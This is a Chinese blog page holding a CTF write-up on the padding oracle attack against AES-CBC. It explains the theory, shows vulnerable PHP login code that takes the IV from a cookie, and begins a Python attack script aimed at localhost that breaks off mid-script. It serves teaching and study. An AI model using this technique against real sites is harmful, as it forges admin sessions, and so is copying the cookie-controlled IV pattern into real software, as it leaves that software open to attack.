@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Ywc">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ywc">
+    <meta name="keywords" content="Hexo | Ywc">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Padding Oracle Attack · Ywc&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=201807017_1502 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180709 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/ywc.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ywc&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Padding Oracle Attack</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Ywc's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/blog.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Padding Oracle Attack
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞">漏洞</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,310</span> / Reading time: <span class="post-count">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/07/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>参考文章：<a href="https://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md" target="_blank" rel="noopener">文章1</a> <a href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/" target="_blank" rel="noopener">文章2</a></p>
+<p>进入题目后可以知道这是一个博客系统，那猜测应该会有后台，扫一下目录或者猜一下可以知道存在login.php, admin.php两个文件，访问admin.php可以发现有权限控制，访问login.php是一个登录界面。</p>
+<p>通过尝试可以发现如果随便输入账号密码的话页面返回是Login failed.，但是账号密码都输入admin的话会跳转到admin.php，猜测这里应该是弱口令，只是除了密码以外还有其他的验证方式。</p>
+<p>如果扫描字典够强大的话可以扫到login.php, admin.php都存在备份文件：.login.php.swp, .admin.php.swp</p>
+<p>下载备份文件.login.php.swp得到源码(可以用<strong>vim -r</strong> 恢复）得到源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'省略'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</span><br><span class="line">  		get_identity();</span><br><span class="line">  		header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(test_identity())&#123;</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_page();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到在session中也做了身份验证，但是由于加密模式是aes-128-cbc，且$token在cookie里，可控，所以这里可以进行Pading Oracle Attack，通过修改$token可以把$_SESSION[‘isadmin’]改为1，这样就成功登录进了admin.php。<br>因此可以用Pading Oracle Attack攻击</p>
+<h2 id="Pading-Oracle-Attack攻击"><a href="#Pading-Oracle-Attack攻击" class="headerlink" title="Pading Oracle Attack攻击"></a>Pading Oracle Attack攻击</h2><p>参考文章：<a href="http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/" target="_blank" rel="noopener">链接</a></p>
+<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>Padding Oracle Attack是一种针对CBC模式分组加密算法的攻击。它可以在不知道密钥（key）的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文。</p>
+<h3 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h3><p>在密码学中，分组加密（Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密，block的大小常见的有64bit、128bit、256bit等。在分组加密的CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。加密过程大致如下图所示：</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/1.jpg" alt="Padding-Oracle-Attack"></p>
+<p>在这个过程中，如果最后一个分组的消息长度没有达到block的大小，则需要填充一些字节，被称为padding。以16个字节一个block为例，如果明文是I_am_Bob，长度为八个字节，则剩下的八个字节被填充了0x08，0x08，0x08，0x08，0x08，0x08，0x08，0x08这八个相同的字节，每个字节的值等于需要填充的字节长度。</p>
+<p>以aes-128-cbc加密模式为例，加密I_am_Bob的过程大致如下：</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/2.jpg" alt="Padding-Oracle-Attack"></p>
+<p>类似的，解密过程大致如下:</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/3.jpg" alt="Padding-Oracle-Attack"></p>
+<p>在解密完成后，如果最后的padding值不正确，解密程序往往会抛出异常(padding error)。而利用应用的错误回显，攻击者往往可以判断出padding是否正确，这就是Padding Oracle Attack的前提。</p>
+<h2 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h2><p>如果攻击者已知并可以控制IV的值，那么攻击者就可以进行Padding Oracle Attack。还是以I_am_Bob和aes-128-cbc加密模式为例。攻击者构造IV为16个0字节，那么此时在解密时的padding是不正确的。</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/4.jpg" alt="Padding-Oracle-Attack"></p>
+<p>正确的padding值只可能为：</p>
+<p>1个字节的padding为0x01</p>
+<p>2个字节的padding为0x02,0x02</p>
+<p>3个字节的padding为0x03,0x03,0x03</p>
+<p>4个字节的padding为0x04,0x04,0x04,0x04</p>
+<p>……</p>
+<p>因为慢慢调整IV的值，以希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01。</p>
+<p>因为middle是固定的（此时我们不知道middle的值），所以从0x00到0xFF之间，只可能有一个值与middle的最后一个字节异或后，结果是0x01。通过遍历这255个值，可以找出IV需要的最后一个字节。</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/5.jpg" alt="Padding-Oracle-Attack"></p>
+<p>此时根据异或的性质，使用0x5e和0x01进行异或就可以得到middle的最后一个值0x5f。</p>
+<p>在正确匹配了padding “0x01” 后，需要做的是继续推导出剩下的middle。根据padding的标准，当需要padding两个字节时，其值应该为0x02,0x02。而我们已经知道了middle的最后一个字节为0x5f，因此可以更新IV的最后一个字节为0x5f^0x02=0x5d，此时可以开始遍历IV的倒数第二个字节。</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/6.jpg" alt="Padding-Oracle-Attack"></p>
+<p>由此可得middle的倒数第二个字节为0x3c^0x02=0x3e。以此类推，可以推导出所有的middle。</p>
+<p>获得middle后，与原来的IV进行异或，便可得到明文。在这个过程中，仅仅用到了密文和IV，通过对padding的推导，即可还原出明文，而不需要知道密钥(key)是什么。而IV并不需要保密，它往往是以明文形式发送的。</p>
+<p>而获得middle后，还可以通过改变IV，使密文解密为任意明文。根据异或的性质，有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原明文 ^ 原IV = middle</span><br><span class="line">新明文 ^ 新IV = middle</span><br><span class="line">∴ 原明文 ^ 原IV ^ 新明文 = 新IV</span><br></pre></td></tr></table></figure>
+<p>故只要把原IV改为计算得到的新IV，就可使密文解密为任意明文。</p>
+<h2 id="0x04-实例"><a href="#0x04-实例" class="headerlink" title="0x04 实例"></a>0x04 实例</h2><p>假设某网站的后端身份验证代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"******"</span>); <span class="comment">//key不可知</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $id = <span class="string">'***'</span>; <span class="comment">//原明文不可知</span></span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>]))</span><br><span class="line">    get_identity();</span><br><span class="line">test_identity();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">"isadmin"</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You are admin!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析代码可知，该网站把用户的id用随机生成的token作为IV进行aes-128-cbc模式加密，并把加密后的id储存在session中，token储存在cookie中。而之后会把session中的id进行解密来验证用户是否为管理员。</p>
+<p>在这种情况下，我们可以修改cookie中的token的值，也就是解密时的IV的值，那么就可以进行Padding Oracle Attack，从而获得管理员的身份。</p>
+<p>具体的思路是：我们通过Padding Oracle Attack来获得aes-128-cbc加密中的middle的值，然后再修改token的值使其和middle进行xor后所得的值为admin，这样就能通过身份验证，获得管理员权限。</p>
+<p>攻击脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://127.0.0.1/cbc.php'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></span><br><span class="line">    header = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID="</span> + phpsession + <span class="string">";token="</span> + token&#125;</span><br><span class="line">    result = requests.post(url, headers = header)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> 